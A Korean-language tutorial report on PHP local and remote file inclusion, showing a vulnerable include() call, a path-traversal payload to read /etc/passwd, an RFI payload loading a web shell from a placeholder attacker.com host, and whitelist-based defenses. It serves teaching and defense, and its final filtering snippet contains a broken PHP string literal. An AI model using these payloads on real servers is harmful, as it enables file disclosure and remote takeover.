# File Inclusion (LFI/RFI) 분석 보고서

## 1. File Inclusion 이란?

**의도치 않은 파일을 서버에 포함시키다**

- **정의:** 공격자가 웹 애플리케이션의 파일 포함(include) 기능을 악용하여, 의도치 않은 로컬 또는 원격 파일을 서버에서 실행시키는 취약점입니다.
- **종류:**
    - **LFI (Local File Inclusion):** 서버 내부에 있는 다른 파일을 포함시키는 공격.
    - **RFI (Remote File Inclusion):** 외부 서버에 있는 악성 파일을 포함시키는 공격. (PHP 설정에서 `allow_url_include`가 활성화된 경우 가능)
- **영향:**
    - **민감 정보 유출:** 시스템 설정 파일, 소스 코드, 사용자 정보 등을 탈취합니다.
    - **원격 코드 실행:** 공격자가 원하는 코드를 서버에서 실행하여 시스템을 장악합니다.
    - **서비스 거부(DoS):** 서버의 중요 파일을 손상시켜 서비스를 마비시킵니다.

---

## 2. 취약한 코드 분석 (예시)

**문제의 핵심: 사용자 입력값으로 파일 경로를 생성**

```php
// 사용자가 URL을 통해 입력한 페이지 이름
$page = $_GET['page'];

// 취약한 코드
// 애플리케이션은 'home', 'about' 같은 페이지를 불러오려고 의도했습니다.
include($page . '.php');
```

**핵심 문제점:** 사용자 입력값을 아무런 검증 없이 `include` 함수의 인자로 사용하여, 공격자가 파일 경로를 직접 조작할 수 있는 여지를 제공합니다.

---

## 3. 공격 시나리오 1: LFI (로컬 파일 인클루전)

**공격 목표:** 서버의 `/etc/passwd` 파일을 읽어 시스템 사용자 목록 확인하기

**공격 페이로드:** `../../../../etc/passwd%00`

**공격 과정:**
1.  공격자는 `../`를 반복 사용하여 상위 디렉터리로 이동합니다.
2.  `%00` (널 바이트)를 사용하여, 코드에서 자동으로 덧붙이는 `.php` 확장자를 무력화시킵니다.
3.  결과적으로 `include('../../etc/passwd%00.php')`가 아닌 `include('../../etc/passwd')`가 실행되어, `/etc/passwd` 파일의 내용이 화면에 출력됩니다.

---

## 4. 공격 시나리오 2: RFI (원격 파일 인클루전)

**공격 목표:** 외부의 악성 셸 스크립트를 서버에서 실행하여 원격 제어권 획득하기

**공격 페이로드:** `http://attacker.com/shell.txt`

**공격 과정:**
1.  공격자는 자신의 서버(`attacker.com`)에 PHP 웹 셸 코드가 담긴 `shell.txt` 파일을 준비합니다.
2.  공격자는 `page` 파라미터 값으로 해당 파일의 URL을 전달합니다.
3.  만약 서버의 PHP 설정에서 `allow_url_include`가 활성화되어 있다면, 서버는 공격자의 서버에서 `shell.txt` 파일을 다운로드하여 PHP 코드로 실행합니다.
4.  공격자는 웹 셸을 통해 서버의 제어권을 획득하게 됩니다.

---

## 5. 해결책: 화이트리스트 (Whitelist) 기반 처리

**가장 안전한 방법: 허용된 파일 목록을 만들어 사용하기**

```php
// 포함할 수 있는 파일들의 목록 (화이트리스트)
$allowed_pages = [
    'home' => 'pages/home.php',
    'about' => 'pages/about.php',
    'contact' => 'pages/contact.php'
];

// 사용자가 요청한 페이지
$page = $_GET['page'];

// 요청된 페이지가 화이트리스트에 있는지 확인
if (array_key_exists($page, $allowed_pages)) {
    // 목록에 있는 경우에만 해당 파일 경로를 사용
    include($allowed_pages[$page]);
} else {
    // 목록에 없으면 에러 페이지를 보여줌
    include('pages/error.php');
}
```

**작동 원리:** 사용자 입력값을 파일 경로 생성에 직접 사용하지 않고, 미리 정의된 안전한 파일 목록(화이트리스트)에서 값을 찾아 사용합니다. 이를 통해 공격자가 파일 경로를 조작할 가능성을 원천적으로 차단합니다.

---

## 6. 파일 인클루전 방어 전략

1.  **화이트리스트 사용 (가장 중요):** 포함할 파일 목록을 서버 측에 미리 정의하고, 이 목록에 있는 파일만 포함하도록 구현합니다.
2.  **`allow_url_include` 비활성화:** `php.ini` 설정에서 `allow_url_include = Off`로 설정하여 RFI 공격을 원천적으로 차단합니다.
3.  **`basename()` 함수 사용:** 사용자 입력값에 `basename()` 함수를 적용하여 디렉터리 순회 문자(`../`, `/` 등)를 제거합니다.
4.  **입력값 검증:** 파일 경로에 사용될 수 있는 위험한 문자(`../`, `/`, `
`, `%00` 등)를 필터링합니다.
5.  **`open_basedir` 설정:** PHP가 접근할 수 있는 파일 시스템의 경로를 특정 디렉터리로 제한합니다.

```php
// 예시: basename() 함수 사용
$page = basename($_GET['page']);

// 예시: 위험 문자 필터링 (간단한 예시)
$page = str_replace(array('../', '/', '\'), '', $page);
```
